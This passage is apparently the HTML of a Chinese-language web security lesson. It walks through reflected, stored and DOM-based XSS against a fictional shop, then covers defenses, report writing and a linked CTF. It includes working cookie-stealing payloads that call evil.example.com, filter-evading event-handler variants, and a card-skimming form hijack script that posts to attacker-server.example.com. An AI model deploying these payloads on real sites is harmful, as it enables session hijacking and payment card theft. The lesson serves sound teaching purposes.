class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">https://cybershop.example.com/search?q=%3Cscript%3Efetch(%27https%3A%2F%2Fevil.example.com%2Fsteal%3Fc%3D%27%2BencodeURIComponent(document.cookie))%3C%2Fscript%3E</code></pre></div>\n\n<h4>社会工程学：让受害者点击链接</h4>\n\n<p>反射型 XSS 需要受害者主动访问这个特制 URL。攻击者通常通过社会工程学手段传播链接：</p>\n\n<ul>\n  <li>在论坛或社交媒体发布伪装后的链接：\"CyberShop 限时优惠，点击领取 50 元优惠券！\"</li>\n  <li>发送邮件钓鱼：\"您的订单有异常，请点击此处查看详情\"</li>\n  <li>使用 URL 短链接服务隐藏真实 URL，降低受害者的警惕</li>\n</ul>\n\n<p>当受害者点击链接后，整个过程在毫秒内完成，用户甚至不会察觉到异常——页面看起来正常显示了搜索结果，但在后台，恶意代码已经把 Cookie 发送给了攻击者。</p>\n\n<div class=\"callout warn\"><div class=\"callout-title\">更隐蔽的技巧</div><p>熟练的攻击者不会使用 <code>&lt;script&gt;</code> 标签，因为它最容易被检测到。以下是常见的替代方案：</p>\n<ul>\n  <li><code>&lt;img src=x onerror=\"恶意代码\"&gt;</code> — 图片加载失败时触发</li>\n  <li><code>&lt;svg onload=\"恶意代码\"&gt;</code> — SVG 加载时触发</li>\n  <li><code>&lt;body onload=\"恶意代码\"&gt;</code> — 页面加载时触发</li>\n  <li><code>&lt;input onfocus=\"恶意代码\" autofocus&gt;</code> — 自动聚焦时触发</li>\n  <li><code>&lt;details open ontoggle=\"恶意代码\"&gt;</code> — 切换状态时触发</li>\n</ul>\n<p>这些变体都利用了 HTML 的<strong>事件处理器属性</strong>，在特定事件发生时执行 JavaScript。</p></div>\n\n<p>让我们看一个使用 <code>&lt;img&gt;</code> 标签的变体：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-html\">&lt;img src=x onerror=\"fetch('https://evil.example.com/steal?c='+encodeURIComponent(document.cookie))\"&gt;</code></pre></div>\n\n<p>这个 payload 的优势在于：<code>&lt;img&gt;</code> 标签看起来更\"无害\"，一些简单的过滤器可能只检测 <code>&lt;script&gt;</code> 而忽略其他标签。</p>\n\n<h4>攻击链的完整视图</h4>\n\n<p>让我们用一张清晰的流程图来总结反射型 XSS 窃取 Cookie 的完整攻击链：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">攻击者                          受害者浏览器                    攻击者服务器\n  |                                  |                              |\n  |--- 1. 发送钓鱼链接(邮件等) ----&gt;|                              |\n  |                                  |                              |\n  |                        2. 点击链接，发送请求                    |\n  |                        到 CyberShop /search?q=...               |\n  |                                  |                              |\n  |                        3. CyberShop 返回                        |\n  |                        包含恶意脚本的页面                       |\n  |                                  |                              |\n  |                        4. 浏览器执行恶意                        |\n  |                        JavaScript，读取 cookie                  |\n  |                                  |                              |\n  |                                  |--- 5. 发送 cookie ---------&gt;|\n  |                                  |                              |\n  |                                  |                   6. 保存窃取的\n  |                                  |                      cookie 到文件\n  |                                  |                              |\n  |&lt;--- 7. 攻击者使用窃取的         |                              |\n  |      cookie 冒充用户登录 ------&gt;|                              |</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<h3>更隐蔽的攻击：存储型 XSS</h3>\n\n<p>在对搜索框的 XSS 进行报告后，CyberShop 的开发团队修复了搜索功能——他们对搜索参数进行了 HTML 转义。你的反射型 XSS 攻击不再奏效。</p>\n\n<p>但你不会就此放弃。在继续探索时，你回到了那个最初引起你注意的功能：<strong>商品评论系统</strong>。</p>\n\n<h4>评论系统的工作方式</h4>\n\n<p>当用户在商品页面提交评论时：</p>\n\n<ol>\n  <li>评论内容通过 POST 请求发送到服务器</li>\n  <li>服务器将评论保存到数据库</li>\n  <li>当其他用户访问该商品页面时，服务器从数据库读取所有评论并渲染到 HTML 中</li>\n</ol>\n\n<p>你尝试在评论框中输入：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-html\">这个商品非常好！&lt;script&gt;alert('存储型XSS')&lt;/script&gt;</code></pre></div>\n\n<p>提交后，你查看评论区域的页面源代码，发现了令人兴奋的结果：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-html\">&lt;div class=\"reviews\"&gt;\n  &lt;div class=\"review-card\"&gt;\n    &lt;div class=\"review-header\"&gt;\n      &lt;span class=\"user\"&gt;pentester_01&lt;/span&gt;\n      &lt;span class=\"date\"&gt;2025-01-15&lt;/span&gt;\n    &lt;/div&gt;\n    &lt;div class=\"review-content\"&gt;\n      这个商品非常好！&lt;script&gt;alert('存储型XSS')&lt;/script&gt;\n    &lt;/div&gt;\n  &lt;/div&gt;\n&lt;/div&gt;</code></pre></div>\n\n<p>评论<strong>被原样存储</strong>并在页面中<strong>原样渲染</strong>！这意味着每个访问这个商品页面的用户，浏览器都会执行这段恶意脚本。</p>\n\n<h4>存储型 vs 反射型：质的飞跃</h4>\n\n<p>存储型 XSS 比反射型危险得多，原因如下：</p>\n\n<ul>\n  <li><strong>无需社会工程学</strong>——受害者不需要点击特制链接，只需正常浏览商品页面就会中招</li>\n  <li><strong>影响范围广</strong>——热门商品页面可能有成千上万的访问量，每个访问者都是受害者</li>\n  <li><strong>持久性</strong>——恶意代码存储在数据库中，持续生效直到被清除</li>\n  <li><strong>隐蔽性高</strong>——URL 中没有任何异常参数，用户和安全设备更难发现</li>\n</ul>\n\n<p>你将评论中的 payload 升级为窃取 Cookie 的版本：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-html\">&lt;script&gt;\n  // 只在页面加载后执行一次，避免重复发送\n  if (!window.__xss_fired) {\n    window.__xss_fired = true;\n    fetch('https://evil.example.com/steal?c=' \n      + encodeURIComponent(document.cookie)\n      + '&amp;p=' + encodeURIComponent(window.location.href));\n  }\n&lt;/script&gt;</code></pre></div>\n\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>注意 payload 中增加了 <code>window.location.href</code> 参数——这会让攻击者知道受害者在哪个页面触发了脚本，便于后续分析。在实际攻击中，攻击者通常还会收集 <code>navigator.userAgent</code>（浏览器类型）、<code>screen.width</code>（屏幕分辨率）等信息，用于指纹识别。</p></div>\n\n<h4>存储型 XSS 的攻击面</h4>\n\n<p>商品评论不是唯一的攻击面。在 CyberShop 中，你继续搜索其他可能的存储型 XSS 入口：</p>\n\n<ul>\n  <li><strong>用户个人资料</strong>——昵称、个性签名、收货地址</li>\n  <li><strong>客服工单</strong>——用户提交的问题描述</li>\n  <li><strong>商品名称</strong>——如果允许卖家自定义商品名且未过滤</li>\n  <li><strong>订单备注</strong>——买家给卖家的留言</li>\n</ul>\n\n<p>所有这些位置都有一个共同特点：用户输入被<strong>持久化存储</strong>并在某个页面中<strong>展示给其他用户</strong>。每一个都是潜在的存储型 XSS 入口。</p>\n\n<h4>历史著名案例：Samy 蠕虫</h4>\n\n<p>2005 年 10 月，一个名叫 Samy Kamkar 的 19 岁少年在 MySpace（当时最大的社交网络之一）上发布了一段存储型 XSS 代码。这段代码做了一件巧妙的事：每个访问 Samy 个人主页的用户，不仅会被感染，还会<strong>自动把 Samy 加为好友</strong>，同时把同样的恶意代码复制到自己的个人主页上。</p>\n\n<p>结果：在短短 <strong>20 小时内</strong>，Samy 蠕虫感染了超过 <strong>100 万</strong> 用户，MySpace 被迫关闭部分服务进行紧急修复。这是互联网历史上第一个大规模 XSS 蠕虫，也是存储型 XSS 破坏力的经典证明。</p>\n\n<h3>DOM 型 XSS：无需服务器的攻击</h3>\n\n<p>你的渗透测试还在继续。CyberShop 的开发团队修复了评论系统的 XSS 漏洞，你决定检查其他功能点。</p>\n\n<p>你注意到商品列表页有一个\"筛选\"功能。URL 格式如下：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">https://cybershop.example.com/products?category=electronics&amp;filter=热销</code></pre></div>\n\n<p>页面上会显示：\"当前筛选：<strong>热销</strong>\"。有趣的是，你查看服务器的 HTML 源代码时，发现这行文字并不在服务器返回的 HTML 中。它是通过 JavaScript 动态生成的。</p>\n\n<p>你在页面源代码中找到了这段 JavaScript：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-javascript\">// CyberShop 的商品筛选页面 - filter.js\nfunction displayFilter() {\n  // 从 URL 中获取 filter 参数\n  const params = new URLSearchParams(window.location.search);\n  const filterValue = params.get('filter');\n  \n  if (filterValue) {\n    // 在页面上显示当前筛选条件\n    const filterDisplay = document.getElementById('filter-display');\n    filterDisplay.innerHTML = '当前筛选：<strong>' + filterValue + '</strong>';\n  }\n}\n\n// 页面加载时执行\ndocument.addEventListener('DOMContentLoaded', displayFilter);</code></pre></div>\n\n<p>你的安全直觉立刻发出了警报。这段代码存在一个严重问题：它使用 <code>innerHTML</code> 将 URL 参数直接插入到 DOM 中，<strong>没有任何过滤或转义</strong>。</p>\n\n<h4>DOM 型 XSS 的触发</h4>\n\n<p>构造以下 URL：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">https://cybershop.example.com/products?filter=&lt;img src=x onerror=\"alert('DOM-XSS')\"&gt;</code></pre></div>\n\n<p>当受害者访问这个 URL 时，以下事件在浏览器中依次发生：</p>\n\n<ol>\n  <li>浏览器向服务器请求 <code>/products?filter=...</code></li>\n  <li>服务器返回页面 HTML（不包含恶意内容——服务器不关心 filter 参数的值）</li>\n  <li>浏览器执行 <code>filter.js</code>，<code>URLSearchParams</code> 从 URL 中读取 filter 参数</li>\n  <li><code>innerHTML</code> 将参数值插入 DOM：<code>'当前筛选：&lt;strong&gt;&lt;img src=x onerror=\"alert(\\'DOM-XSS\\')\"&gt;&lt;/strong&gt;'</code></li>\n  <li>浏览器解析插入的 HTML，创建 <code>&lt;img&gt;</code> 元素，尝试加载 <code>src=x</code></li>\n  <li>图片加载失败，触发 <code>onerror</code> 事件，执行 <code>alert('DOM-XSS')</code></li>\n</ol>\n\n<div class=\"callout warn\"><div class=\"callout-title\">DOM XSS 的独特之处</div><p>与反射型和存储型 XSS 不同，DOM 型 XSS 的整个攻击过程<strong>完全发生在浏览器端</strong>。恶意数据<strong>从未经过服务器</strong>的处理。这意味着：</p>\n<ul>\n  <li>服务器端的安全措施（如 WAF、输入过滤）<strong>完全无法防御</strong> DOM 型 XSS</li>\n  <li>传统的服务器日志<strong>不会记录</strong>攻击痕迹</li>\n  <li>必须通过审查前端 JavaScript 代码才能发现漏洞</li>\n</ul></div>\n\n<h4>常见的 DOM XSS 危险模式</h4>\n\n<p>在你的渗透测试生涯中，以下 JavaScript 代码模式应该立即引起你的注意：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-javascript\">// 危险的输入源（Sources）—— 攻击者可控的数据\nwindow.location.search      // URL 查询参数\nwindow.location.hash        // URL 片段标识符 (#后面的部分)\nwindow.location.href        // 完整 URL\ndocument.referrer           // 来源页面 URL\ndocument.cookie             // Cookie\nwindow.name                 // 窗口名称\nlocalStorage / sessionStorage  // 本地存储\n\n// 危险的输出点（Sinks）—— 将数据写入 DOM 的方式\nelement.innerHTML = ...           // 解析并渲染 HTML\nelement.outerHTML = ...           // 替换整个元素（含 HTML 解析）\ndocument.write(...)               // 向文档流写入 HTML\ndocument.writeln(...)             // 同上，附加换行\neval(...)                         // 将字符串作为代码执行\nsetTimeout(func_string, ...)      // 字符串形式的定时执行\nsetInterval(func_string, ...)     // 字符串形式的周期执行\nnew Function(string)              // 从字符串创建函数</code></pre></div>\n\n<p>当攻击者可控的 <strong>Source</strong> 数据流入危险的 <strong>Sink</strong> 时，DOM 型 XSS 就产生了。这是分析前端安全的核心思维模型。</p>\n\n<h4>三种 XSS 类型的对比</h4>\n\n<p>到目前为止，你已经实战了三种 XSS 类型。让我们系统性地对比它们：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">┌──────────┬──────────────────┬──────────────────┬──────────────────┐\n│  特征     │   反射型 XSS     │   存储型 XSS     │   DOM 型 XSS     │\n├──────────┼──────────────────┼──────────────────┼──────────────────┤\n│ 恶意代码  │ URL 参数         │ 数据库           │ URL 参数或       │\n│ 存储位置  │ (不持久化)       │ (持久化)         │ 其他浏览器API    │\n├──────────┼──────────────────┼──────────────────┼──────────────────┤\n│ 是否经过  │     是           │     是           │     否           │\n│ 服务器    │                  │                  │                  │\n├──────────┼──────────────────┼──────────────────┼──────────────────┤\n│ 需要诱导  │     是           │     否           │     是           │\n│ 用户点击  │ (点击特制链接)   │ (正常浏览即可)   │ (点击特制链接)   │\n├──────────┼──────────────────┼──────────────────┼──────────────────┤\n│ 影响范围  │ 点击链接的用户   │ 所有访问者       │ 点击链接的用户   │\n├──────────┼──────────────────┼──────────────────┼──────────────────┤\n│ 防御重点  │ 服务器端输出编码 │ 服务器端输出编码 │ 前端安全编码     │\n│          │ + 输入验证        │ + 输入验证        │ + 避免危险Sink   │\n├──────────┼──────────────────┼──────────────────┼──────────────────┤\n│ 危险等级  │   中             │   高             │   中~高          │\n└──────────┴──────────────────┴──────────────────┴──────────────────┘</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>\n\n<h3>真实案例分析</h3>\n\n<p>XSS 不是纸上谈兵的学术问题。以下是安全史上几个里程碑式的 XSS 攻击事件，它们深刻地影响了整个行业对 Web 安全的认知。</p>\n\n<h4>案例一：Samy 蠕虫（2005）</h4>\n\n<p>前文已经介绍过这个案例。补充一个技术细节：MySpace 当时已经对部分 HTML 标签做了过滤，但 Samy 巧妙地利用了 CSS 的 <code>background-image</code> 属性和 JavaScript 的 <code>eval()</code> 函数来绕过过滤。这告诉我们：<strong>黑名单过滤是不可靠的</strong>，攻击者总能找到绕过方法。</p>\n\n<h4>案例二：British Airways 数据泄露（2018）</h4>\n\n<p>2018 年，英国航空公司的支付页面被植入了存储型 XSS 恶意脚本（通过第三方 JavaScript 库被篡改）。该脚本在用户填写支付信息时，将信用卡号、姓名、地址等敏感数据发送到攻击者控制的域名。</p>\n\n<p>这次攻击影响了约 <strong>38 万</strong> 笔交易。英国航空因此被罚款 <strong>2000 万英镑</strong>（最初拟罚 1.83 亿英镑），成为 GDPR 实施后最大的罚款案例之一。</p>\n\n<p>这个案例的特殊之处在于：攻击者不需要窃取 Cookie，而是<strong>直接在支付表单中监听用户输入</strong>：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-javascript\">// 类似 British Airways 攻击中使用的表单劫持技术\ndocument.querySelector('#payment-form').addEventListener('submit', function(e) {\n  const cardNumber = document.querySelector('#card-number').value;\n  const cvv = document.querySelector('#card-cvv').value;\n  const expiry = document.querySelector('#card-expiry').value;\n  \n  // 将数据发送到攻击者的服务器\n  fetch('https://attacker-server.example.com/collect', {\n    method: 'POST',\n    body: JSON.stringify({\n      card: cardNumber,\n      cvv: cvv,\n      expiry: expiry,\n      page: window.location.href\n    })\n  });\n  // 不阻止表单提交，用户不会察觉异常\n});</code></pre></div>\n\n<h4>案例三：Twitter XSS 蠕虫（2011）</h4>\n\n<p>2011 年，Twitter 出现了多个 XSS 漏洞。其中一个利用了 <code>onmouseover</code> 事件——当用户将鼠标悬停在包含恶意代码的推文上方时，脚本就会执行。攻击者利用这个漏洞发布了自动转发的推文，形成了蠕虫传播。Twitter 不得不紧急修复。</p>\n\n<p>这些案例共同说明：<strong>XSS 漏洞存在于各种规模和类型的 Web 应用中</strong>，从社交平台到航空公司，从初创企业到全球巨头，无一幸免。</p>\n\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>OWASP（开放 Web 应用安全项目）长期将 XSS 列为 <strong>Web 应用十大安全风险</strong> 之一。虽然近年来由于框架的普及，XSS 的排名有所下降，但它仍然是最常见的 Web 漏洞之一。根据 HackerOne 的报告，XSS 是漏洞赏金计划中报告数量最多的漏洞类型之一。</p></div>\n\n<h3>防御方案：从攻击者视角理解防御</h3>\n\n<p>作为渗透测试员，你不仅要会攻击，还要理解防御。只有理解防御的原理，你才能更准确地评估漏洞风险，也能在安全报告中给出有价值的修复建议。</p>\n\n<p>让我们逐一分析针对上述每种攻击的防御措施，并理解<strong>为什么</strong>这些措施有效。</p>\n\n<h4>防御一：输出编码（Output Encoding）</h4>\n\n<p>输出编码是防御 XSS 的<strong>第一道也是最重要的防线</strong>。核心思想是：在将用户输入插入 HTML 页面之前，把特殊字符转换为它们的 HTML 实体形式，使浏览器将其视为<strong>纯文本</strong>而非可执行代码。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">字符转换对照表：\n\n原始字符    HTML 实体      效果\n&lt;          &amp;lt;          浏览器显示 &lt; 但不解析为标签开始\n&gt;          &amp;gt;          浏览器显示 &gt; 但不解析为标签结束\n&amp;          &amp;amp;         浏览器显示 &amp; 但不解析为实体开始\n\"          &amp;quot;        在属性值中防止逃逸\n'          &amp;#x27;        在属性值中防止逃逸\n/          &amp;#x2F;        防止关闭 &lt;script&gt; 标签</code></pre></div>\n\n<p>让我们看看编码前后的效果对比：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-javascript\">// 未编码（危险！）—— 攻击者的 payload\nconst userInput = '&lt;script&gt;alert(\"XSS\")&lt;/script&gt;';\nelement.innerHTML = '搜索结果: ' + userInput;\n// 结果: 浏览器执行了 alert(\"XSS\")\n\n// HTML 实体编码后（安全）\nfunction htmlEncode(str) {\n  const map = {\n    '&amp;': '&amp;amp;',\n    '&lt;': '&amp;lt;',\n    '&gt;': '&amp;gt;',\n    '\"': '&amp;quot;',\n    \"'\": '&amp;#x27;',\n    '/': '&amp;#x2F;'\n  };\n  return str.replace(/[&amp;&lt;&gt;\"'/]/g, char =&gt; map[char]);\n}\n\nconst encoded = htmlEncode(userInput);\n// encoded = '&amp;lt;script&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/script&amp;gt;'\nelement.innerHTML = '搜索结果: ' + encoded;\n// 结果: 浏览器显示文本 \"&lt;script&gt;alert(\"XSS\")&lt;/script&gt;\"，但不执行</code></pre></div>\n\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>注意：HTML 实体编码只在将数据插入 <strong>HTML 上下文</strong>时有效。如果数据被插入到 JavaScript 代码块中（如 <code>&lt;script&gt;var x = \"用户输入\";&lt;/script&gt;</code>），则需要使用 <strong>JavaScript 编码</strong>（将特殊字符转为 <code>\\xHH</code> 或 <code>\\uHHHH</code> 形式）。如果数据被插入 URL 属性中，则需要 <strong>URL 编码</strong>。<em>上下文不同，编码方式不同</em>——这是 XSS 防御中最容易被忽视的要点。</p></div>\n\n<h4>防御二：Content Security Policy（CSP）</h4>\n\n<p>CSP 是一个 HTTP 响应头，它告诉浏览器：<strong>哪些来源的脚本可以执行，哪些不能</strong>。即使攻击者成功注入了恶意脚本，CSP 也可以阻止浏览器执行它。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 严格的 CSP 头\nContent-Security-Policy: \n  default-src 'self';\n  script-src 'self' https://cdn.trusted.com;\n  style-src 'self' 'unsafe-inline';\n  img-src 'self' https://images.trusted.com;\n  connect-src 'self';\n  object-src 'none';\n  frame-ancestors 'none';</code></pre></div>\n\n<p>这个策略的含义是：</p>\n<ul>\n  <li><code>script-src 'self'</code> — 只允许执行同域的脚本文件，<strong>禁止内联脚本</strong>（<code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 不会执行）</li>\n  <li><code>connect-src 'self'</code> — 只允许向同域发送网络请求（<code>fetch('https://evil.example.com/...')</code> 会被阻止）</li>\n  <li><code>object-src 'none'</code> — 禁止加载插件内容（如 Flash）</li>\n</ul>\n\n<p>回到我们的攻击场景：如果 CyberShop 配置了上述 CSP，即使你成功注入了 <code>&lt;script&gt;</code> 标签，浏览器也会拒绝执行，并在控制台输出错误：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">Refused to execute inline script because it violates the following\nContent Security Policy directive: \"script-src 'self'\"</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">CSP 的局限</div><p>CSP 非常强大，但不是万能的。如果页面中已经存在一个同域的 JavaScript 文件，且该文件有可被利用的函数（称为 <strong>CSP bypass</strong>），攻击者仍可能绕过 CSP。此外，如果 CSP 中使用了 <code>'unsafe-inline'</code> 或 <code>'unsafe-eval'</code>，则防御效果大打折扣。CSP 应被视为<strong>纵深防御的一层</strong>，而非唯一防线。</p></div>\n\n<h4>防御三：HttpOnly Cookie</h4>\n\n<p>回忆一下我们的 Cookie 窃取攻击——恶意脚本通过 <code>document.cookie</code> 读取了用户的会话 Cookie。如果 Cookie 设置了 <code>HttpOnly</code> 标志，JavaScript 就无法访问它：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 服务器设置 Cookie 时添加 HttpOnly 标志\nSet-Cookie: session_id=abc123def456; Path=/; HttpOnly; Secure; SameSite=Strict</code></pre></div>\n\n<p>设置 <code>HttpOnly</code> 后：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-javascript\">// 恶意脚本尝试读取 Cookie\nconsole.log(document.cookie);\n// 输出: \"\" （session_id 不可见）\n\n// 但浏览器仍然会在 HTTP 请求中自动携带这个 Cookie\n// 所以用户的登录状态不受影响\nfetch('/api/profile'); // 请求头中仍包含 Cookie: session_id=abc123def456</code></pre></div>\n\n<div class=\"callout success\"><div class=\"callout-title\">防御效果分析</div><p>HttpOnly 并不能阻止 XSS 攻击本身（恶意脚本仍然可以执行），但它能有效阻止<strong>最危险的攻击后果</strong>——会话劫持。即使攻击者能在页面上执行任意 JavaScript，也偷不到登录凭证。这是典型的\"降低攻击收益\"策略。</p></div>\n\n<h4>防御四：输入验证（Input Validation）</h4>\n\n<p>输入验证是在数据到达服务器时进行检查。虽然单独使用输入验证不足以防御 XSS（因为合法的输入也可能包含特殊字符），但它是纵深防御的重要一环。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-javascript\">// 服务器端输入验证示例 (Node.js/Express)\nfunction validateSearchInput(req, res, next) {\n  const query = req.query.q;\n  \n  if (!query) return next();\n  \n  // 白名单验证：只允许字母、数字、空格和中文\n  const allowedPattern = /^[a-zA-Z0-9\\u4e00-\\u9fa5\\s]+$/;\n  \n  if (!allowedPattern.test(query)) {\n    return res.status(400).json({ \n      error: '搜索内容包含不允许的字符' \n    });\n  }\n  \n  next();\n}</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">为什么输入验证不够？</div><p>考虑一个场景：用户昵称可以是\"张三 &lt;3\"（心形符号用了 <code>&lt;</code>）。这是一个合法的昵称，但如果直接嵌入 HTML，<code>&lt;3</code> 可能被解析为 HTML 标签的开始。输入验证无法区分\"无害的特殊字符\"和\"恶意的 HTML 注入\"，所以<strong>输出编码仍然是必须的</strong>。</p></div>\n\n<h4>防御五：使用安全的 DOM API</h4>\n\n<p>针对 DOM 型 XSS，开发者应该避免使用 <code>innerHTML</code> 等危险的 Sink，改用安全的替代方案：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-javascript\">// 危险的做法\nfilterDisplay.innerHTML = '当前筛选：&lt;strong&gt;' + filterValue + '&lt;/strong&gt;';\n\n// 安全做法一：使用 textContent（自动转义 HTML）\nfilterDisplay.textContent = '当前筛选：' + filterValue;\n\n// 安全做法二：使用 createElement 和 textContent 组合\nconst label = document.createElement('span');\nlabel.textContent = '当前筛选：';\nconst strong = document.createElement('strong');\nstrong.textContent = filterValue; // textContent 不会解析 HTML\nfilterDisplay.appendChild(label);\nfilterDisplay.appendChild(strong);\n\n// 安全做法三：使用现代框架（React、Vue 等）\n// React 的 JSX 默认转义所有插值：\n// &lt;div&gt;当前筛选：&lt;strong&gt;{filterValue}&lt;/strong&gt;&lt;/div&gt;\n// 即使 filterValue 包含 &lt;script&gt;，React 也会自动转义</code></pre></div>\n\n<h4>防御体系总结</h4>\n\n<p>有效的 XSS 防御是一个<strong>多层纵深</strong>的体系：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">┌─────────────────────────────────────────────────────┐\n│                    纵深防御体系                        │\n├─────────────────────────────────────────────────────┤\n│                                                     │\n│  第一层：输入验证                                     │\n│  ├─ 白名单验证（限制允许的字符和格式）                 │\n│  └─ 拒绝明显恶意的输入                                │\n│                                                     │\n│  第二层：输出编码（核心防线）                          │\n│  ├─ HTML 实体编码（插入 HTML 内容时）                  │\n│  ├─ JavaScript 编码（插入 JS 代码时）                  │\n│  ├─ URL 编码（插入 URL 属性时）                        │\n│  └─ 根据上下文选择正确的编码方式                       │\n│                                                     │\n│  第三层：安全的 DOM API                                │\n│  ├─ textContent 替代 innerHTML                        │\n│  ├─ 现代前端框架的自动转义                            │\n│  └─ 避免 eval() 和类似的危险函数                       │\n│                                                     │\n│  第四层：CSP 策略                                     │\n│  ├─ 限制脚本来源                                      │\n│  ├─ 禁止内联脚本                                      │\n│  └─ 限制网络连接目标                                  │\n│                                                     │\n│  第五层：降低攻击收益                                  │\n│  ├─ HttpOnly Cookie（保护会话凭证）                    │\n│  ├─ SameSite Cookie（防止 CSRF）                      │\n│  └─ 最小权限原则（API Token 范围最小化）               │\n│                                                     │\n└─────────────────────────────────────────────────────┘</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"3\"></div>\n\n<h3>安全报告与最佳实践</h3>\n\n<p>在完成对 CyberShop 的渗透测试后，你需要撰写一份专业的安全报告。以下是渗透测试中 XSS 漏洞报告的标准结构：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">漏洞报告模板\n══════════════════════════════════════════════════\n\n标题：[严重程度] 漏洞类型 - 影响的功能点\n示例：[高危] 存储型 XSS - 商品评论系统\n\n1. 漏洞描述\n   简要说明漏洞的本质和位置\n\n2. 复现步骤\n   详细的 step-by-step 操作指南\n   包含完整的 HTTP 请求\n\n3. 影响分析\n   - 可被利用的攻击场景\n   - 影响的用户范围\n   - 潜在的商业影响\n\n4. 证据\n   截图、HTTP 请求/响应记录\n\n5. 修复建议\n   具体的代码级修复方案\n   推荐的防御措施\n\n6. 参考资料\n   OWASP 指南、CVE 编号等</code></pre></div>\n\n<h4>给开发者的最佳实践清单</h4>\n\n<p>在你的安全报告中，附上这份开发者友好的最佳实践清单：</p>\n\n<ol>\n  <li><strong>使用现代框架</strong>——React、Vue、Angular 默认对插值进行 HTML 转义。但要注意 <code>dangerouslySetInnerHTML</code>（React）和 <code>v-html</code>（Vue）这些\"逃生舱口\"——它们会绕过自动转义</li>\n  <li><strong>服务端渲染时始终转义输出</strong>——使用经过验证的库（如 Python 的 <code>markupsafe</code>、Java 的 <code>OWASP Java Encoder</code>、PHP 的 <code>htmlspecialchars</code>）</li>\n  <li><strong>配置严格的 CSP</strong>——禁止内联脚本，限制脚本来源，使用 nonce 或 hash 机制允许必要的内联脚本</li>\n  <li><strong>设置 HttpOnly 和 Secure Cookie</strong>——保护会话凭证不被 JavaScript 读取</li>\n  <li><strong>避免黑名单过滤</strong>——不要试图列举所有危险的标签和属性，使用白名单或依赖输出编码</li>\n  <li><strong>审查第三方依赖</strong>——定期更新依赖，使用工具检测已知漏洞（如 <code>npm audit</code>、Snyk）</li>\n  <li><strong>实施自动化测试</strong>——在 CI/CD 流水线中集成 XSS 扫描工具（如 OWASP ZAP、Burp Suite）</li>\n</ol>\n\n<h3>动手试试</h3>\n\n<p>恭喜你完成了 XSS 跨站脚本攻击的学习！你现在已经掌握了：</p>\n\n<ul>\n  <li>三种 XSS 类型的攻击原理和实战技巧（反射型、存储型、DOM 型）</li>\n  <li>从 alert(1) 到 Cookie 窃取的攻击升级路径</li>\n  <li>真实世界中 XSS 攻击的案例和影响</li>\n  <li>多层纵深的 XSS 防御体系</li>\n  <li>如何撰写专业的 XSS 漏洞报告</li>\n</ul>\n\n<p>现在是时候在实战靶场中检验你的技能了。CTF 挑战将模拟你刚学到的各种 XSS 场景，你需要在限定时间内发现并利用漏洞，最终获得 flag。</p>\n\n<div class=\"callout success\"><div class=\"callout-title\">配套练习</div><p>在 CTF 靶场中，你将面对一个模拟的 CyberShop 商城环境。你需要综合运用反射型、存储型和 DOM 型 XSS 技术，逐步突破安全防线，最终窃取管理员的 flag。每通过一关，难度都会升级——从简单的 alert 弹窗到绕过过滤器的复杂 payload。</p><button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF('ctf-004')\"><span class=\"arrow\">▶</span> CTF挑战: XSS Hunter</button></div>";
+
